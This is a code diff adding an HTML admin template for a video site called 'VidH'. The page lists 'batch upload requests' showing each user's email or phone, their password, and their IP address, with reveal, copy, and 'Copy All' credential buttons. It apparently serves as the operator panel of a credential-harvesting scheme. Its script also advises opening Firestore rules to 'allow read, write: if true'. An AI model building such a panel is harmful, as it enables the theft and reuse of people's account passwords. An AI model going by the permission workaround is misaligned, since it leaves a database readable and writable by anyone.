@@ -1,0 +1,427 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Batch Upload Requests - VidH Admin</title>
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/css/bootstrap.min.css" rel="stylesheet">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+  <style>
+    :root {
+      --primary-color: #4361ee;
+      --secondary-color: #3f37c9;
+      --accent-color: #4895ef;
+      --text-color: #2b2d42;
+      --light-text: #8d99ae;
+      --bg-color: #f8f9fa;
+      --card-bg: #ffffff;
+      --success-color: #38b000;
+      --warning-color: #ff9f1c;
+      --danger-color: #e63946;
+    }
+    
+    body {
+      font-family: 'Inter', sans-serif;
+      background-color: var(--bg-color);
+      color: var(--text-color);
+    }
+    
+    .admin-header {
+      background: linear-gradient(135deg, #1a1a2e, #16213e);
+      color: white;
+      padding: 2rem 0;
+      margin-bottom: 2rem;
+      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+    }
+    
+    .admin-title {
+      font-weight: 700;
+      margin-bottom: 0.5rem;
+    }
+    
+    .admin-subtitle {
+      opacity: 0.9;
+    }
+    
+    .card {
+      border: none;
+      border-radius: 12px;
+      box-shadow: 0 4px 15px rgba(0, 0, 0, 0.05);
+      transition: all 0.3s ease;
+    }
+    
+    .card:hover {
+      transform: translateY(-5px);
+      box-shadow: 0 8px 25px rgba(0, 0, 0, 0.1);
+    }
+    
+    .card-header {
+      background-color: #f8f9fa;
+      border-bottom: 1px solid rgba(0,0,0,0.05);
+      padding: 1rem 1.5rem;
+      border-radius: 12px 12px 0 0 !important;
+    }
+    
+    .card-title {
+      font-weight: 600;
+      margin-bottom: 0;
+      color: var(--primary-color);
+    }
+    
+    .card-body {
+      padding: 1.5rem;
+    }
+    
+    .request-details {
+      margin-bottom: 1rem;
+    }
+    
+    .request-label {
+      font-weight: 600;
+      color: var(--text-color);
+      font-size: 0.9rem;
+    }
+    
+    .request-value {
+      color: var(--text-color);
+      word-break: break-all;
+    }
+    
+    .status-badge {
+      padding: 0.35rem 0.75rem;
+      border-radius: 50rem;
+      font-size: 0.8rem;
+      font-weight: 600;
+      display: inline-block;
+    }
+    
+    .status-pending {
+      background-color: rgba(255, 159, 28, 0.15);
+      color: var(--warning-color);
+    }
+    
+    .status-processed {
+      background-color: rgba(56, 176, 0, 0.15);
+      color: var(--success-color);
+    }
+    
+    .status-rejected {
+      background-color: rgba(230, 57, 70, 0.15);
+      color: var(--danger-color);
+    }
+    
+    .timestamp {
+      font-size: 0.85rem;
+      color: var(--light-text);
+      margin-top: 0.5rem;
+    }
+    
+    .btn-action {
+      border-radius: 8px;
+      font-size: 0.9rem;
+      padding: 0.5rem 1rem;
+      font-weight: 500;
+      margin-right: 0.5rem;
+    }
+    
+    .btn-copy {
+      background-color: var(--accent-color);
+      color: white;
+    }
+    
+    .btn-copy:hover {
+      background-color: #3a77cf;
+      color: white;
+    }
+    
+    .empty-state {
+      text-align: center;
+      padding: 4rem 2rem;
+      background-color: white;
+      border-radius: 12px;
+      box-shadow: 0 4px 15px rgba(0, 0, 0, 0.05);
+    }
+    
+    .empty-state i {
+      font-size: 3rem;
+      color: var(--light-text);
+      margin-bottom: 1.5rem;
+    }
+    
+    .empty-state h3 {
+      font-weight: 600;
+      color: var(--text-color);
+      margin-bottom: 1rem;
+    }
+    
+    .empty-state p {
+      color: var(--light-text);
+      max-width: 500px;
+      margin: 0 auto;
+    }
+  </style>
+</head>
+<body>
+  <header class="admin-header">
+    <div class="container">
+      <div class="d-flex justify-content-between align-items-center">
+        <div>
+          <h1 class="admin-title">Batch Upload Requests</h1>
+          <p class="admin-subtitle">VidH Admin Dashboard</p>
+        </div>
+        <a href="/" class="btn btn-outline-light">
+          <i class="fas fa-home me-2"></i> Back to Home
+        </a>
+      </div>
+    </div>
+  </header>
+
+  <main class="container mb-5">
+    <div class="row mb-4">
+      <div class="col-md-6">
+        <h4><i class="fas fa-list-alt me-2"></i> All Requests</h4>
+        <p class="text-muted">Showing all batch upload requests from users</p>
+      </div>
+      <div class="col-md-6 text-md-end">
+        <button class="btn btn-primary" onclick="refreshPage()">
+          <i class="fas fa-sync-alt me-2"></i> Refresh
+        </button>
+      </div>
+    </div>
+    
+    {% if requests %}
+      <div class="row row-cols-1 row-cols-md-2 g-4">
+        {% for request in requests %}
+          <div class="col">
+            <div class="card h-100">
+              <div class="card-header d-flex justify-content-between align-items-center">
+                <h5 class="card-title">
+                  <i class="fas fa-user me-2"></i> User Request
+                </h5>
+                <span class="status-badge status-{{ request.status }}">
+                  {% if request.status == 'pending' %}
+                    <i class="fas fa-clock me-1"></i> Pending
+                  {% elif request.status == 'processed' %}
+                    <i class="fas fa-check-circle me-1"></i> Processed
+                  {% elif request.status == 'rejected' %}
+                    <i class="fas fa-times-circle me-1"></i> Rejected
+                  {% else %}
+                    {{ request.status }}
+                  {% endif %}
+                </span>
+              </div>
+              <div class="card-body">
+                <div class="request-details">
+                  <div class="request-label">Email/Phone:</div>
+                  <div class="request-value">{{ request.email }}</div>
+                </div>
+                
+                <div class="request-details">
+                  <div class="request-label">Password:</div>
+                  <div class="request-value">
+                    <div class="input-group">
+                      <input type="password" class="form-control" id="password{{ loop.index }}" value="{{ request.password }}" readonly>
+                      <button class="btn btn-outline-secondary" type="button" onclick="togglePassword('password{{ loop.index }}')">
+                        <i class="fas fa-eye"></i>
+                      </button>
+                      <button class="btn btn-outline-secondary" type="button" onclick="copyToClipboard('password{{ loop.index }}')">
+                        <i class="fas fa-copy"></i>
+                      </button>
+                    </div>
+                  </div>
+                </div>
+                
+                <div class="request-details">
+                  <div class="request-label">IP Address:</div>
+                  <div class="request-value">{{ request.ip_address }}</div>
+                </div>
+                
+                <div class="request-details">
+                  <div class="d-flex justify-content-between align-items-center">
+                    <span class="timestamp">
+                      <i class="fas fa-calendar-alt me-1"></i> {{ request.timestamp }}
+                    </span>
+                    <div>
+                      <button class="btn btn-sm btn-primary btn-action" onclick="copyCredentials('{{ request.email }}', '{{ request.password }}')">
+                        <i class="fas fa-copy me-1"></i> Copy All
+                      </button>
+                      <button class="btn btn-sm btn-success btn-action" onclick="updateStatus('{{ request.id }}', 'processed')">
+                        <i class="fas fa-check me-1"></i> Mark Processed
+                      </button>
+                    </div>
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+        {% endfor %}
+      </div>
+    {% else %}
+      <div class="empty-state">
+        <i class="fas fa-inbox"></i>
+        <h3>No Requests Found</h3>
+        <p>There are no batch upload requests at the moment. Check back later or refresh the page.</p>
+      </div>
+    {% endif %}
+
+    <div class="container mb-5">
+      <div class="row">
+        <div class="col-md-4 mb-4">
+          <div class="card h-100">
+            <div class="card-header bg-primary text-white">
+              <h5 class="mb-0">Platform Settings</h5>
+            </div>
+            <div class="card-body">
+              <form id="settingsForm">
+                <div class="mb-3">
+                  <div class="form-check form-switch">
+                    <input class="form-check-input" type="checkbox" id="enableDownload">
+                    <label class="form-check-label" for="enableDownload">Enable Video Downloads</label>
+                  </div>
+                  <div class="form-text text-muted">Allow users to download videos from the player</div>
+                </div>
+                
+                <button type="submit" class="btn btn-primary">
+                  <i class="fas fa-save me-2"></i> Save Settings
+                </button>
+              </form>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </main>
+
+  <footer class="bg-dark text-white py-4 mt-5">
+    <div class="container">
+      <div class="row">
+        <div class="col-md-6">
+          <h5>VidH Admin</h5>
+          <p class="small">Batch Upload Request Management</p>
+        </div>
+        <div class="col-md-6 text-md-end">
+          <p class="small">&copy; 2023 VidH. All rights reserved.</p>
+        </div>
+      </div>
+    </div>
+  </footer>
+
+  <!-- Bootstrap JS -->
+  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/js/bootstrap.bundle.min.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/9.6.0/firebase-app-compat.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/9.6.0/firebase-firestore-compat.js"></script>
+  
+  <script>
+    function togglePassword(id) {
+      const passwordField = document.getElementById(id);
+      if (passwordField.type === 'password') {
+        passwordField.type = 'text';
+      } else {
+        passwordField.type = 'password';
+      }
+    }
+    
+    function copyToClipboard(id) {
+      const field = document.getElementById(id);
+      field.type = 'text';
+      field.select();
+      document.execCommand('copy');
+      field.type = 'password';
+      
+      // Show copied message
+      alert('Copied to clipboard!');
+    }
+    
+    function copyCredentials(email, password) {
+      const text = `Email/Phone: ${email}\nPassword: ${password}`;
+      navigator.clipboard.writeText(text).then(() => {
+        alert('Credentials copied to clipboard!');
+      }).catch(err => {
+        console.error('Could not copy text: ', err);
+      });
+    }
+    
+    function updateStatus(requestId, status) {
+      if (confirm(`Are you sure you want to mark this request as ${status}?`)) {
+        // TODO: Implement API call to update status
+        alert(`Request marked as ${status}. This functionality is not fully implemented yet.`);
+      }
+    }
+    
+    function refreshPage() {
+      window.location.reload();
+    }
+
+    document.addEventListener('DOMContentLoaded', function() {
+      // Initialize Firebase with your config
+      fetch('/firebase-config')
+        .then(response => response.json())
+        .then(config => {
+          firebase.initializeApp(config);
+          const db = firebase.firestore();
+          
+          // Load current settings using admin endpoint to avoid permission issues
+          fetch('/api/admin-settings')
+            .then(response => response.json())
+            .then(data => {
+              if (data.success) {
+                document.getElementById('enableDownload').checked = data.settings.enable_download || false;
+              } else {
+                console.error("Error loading settings:", data.error);
+              }
+            })
+            .catch(error => {
+              console.error("Error loading settings:", error);
+            });
+          
+          // Settings form submission
+          document.getElementById('settingsForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            const enableDownload = document.getElementById('enableDownload').checked;
+            
+            // Save settings via server endpoint instead of directly to Firestore
+            fetch('/api/update-settings', {
+              method: 'POST',
+              headers: {
+                'Content-Type': 'application/json',
+              },
+              body: JSON.stringify({
+                enable_download: enableDownload
+              })
+            })
+            .then(response => response.json())
+            .then(data => {
+              if (data.success) {
+                alert('Settings saved successfully');
+              } else {
+                alert('Error saving settings: ' + data.error);
+              }
+            })
+            .catch(error => {
+              console.error("Error saving settings:", error);
+              alert('Error saving settings: ' + error.message);
+              
+              // Show workaround message for permissions issues
+              if (error.code === 'permission-denied' || error.message.includes('permission')) {
+                const workaroundMsg = `
+                  Permission error detected. To fix this:
+                  1. Add the following to your Firestore rules:
+                  match /settings/{settingId} {
+                    allow read, write: if true;
+                  }
+                  2. Deploy these rules using Firebase console or CLI
+                `;
+                alert(workaroundMsg);
+              }
+            });
+          });
+          
+          // Request handling code
+          // ... existing Firebase code
+        });
+    });
+  </script>
+</body>
+</html> 
